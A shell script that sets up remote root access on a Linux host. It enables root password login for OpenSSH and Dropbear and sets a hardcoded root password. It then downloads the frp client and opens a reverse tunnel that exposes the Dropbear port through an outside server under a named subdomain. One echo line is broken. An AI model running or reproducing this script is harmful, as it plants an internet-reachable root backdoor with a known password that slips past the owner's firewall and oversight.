export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 >/dev/null
netstat -ntlp
sleep 3
cat > /etc/ssh/sshd_config <<EOR
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
EOR

sleep 2

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2

echo "root:Pmataga87465622" | chpasswd
service ssh restart
sleep 2
service dropbear restart 

wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz
tar -xvf frp_0.48.0_linux_amd64.tar.gz
# start from daemon
cp frp_0.48.0_linux_amd64/frpc /usr/bin
mkdir /etc/frp
mkdir /var/frp  # log

sleep 2

cat > /etc/frp/frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.fun
server_port = 80

[ssh.waltermaxhontintera2]
type = tcp
local_ip = 127.0.0.1
local_port = 2299
remote_port = 2001
subdomain = waltermaxhontintera

END

sleep 2

netstat -ntlp

sleep 2

"echo Your IP address is: "
curl api.ipify.org
sleep 2
echo " "
echo " "
echo " "
echo " "
sleep 2

#waltermaxhontintera.emergencyaccess.teatspray.fun

/usr/bin/frpc -c /etc/frp/frpc.ini

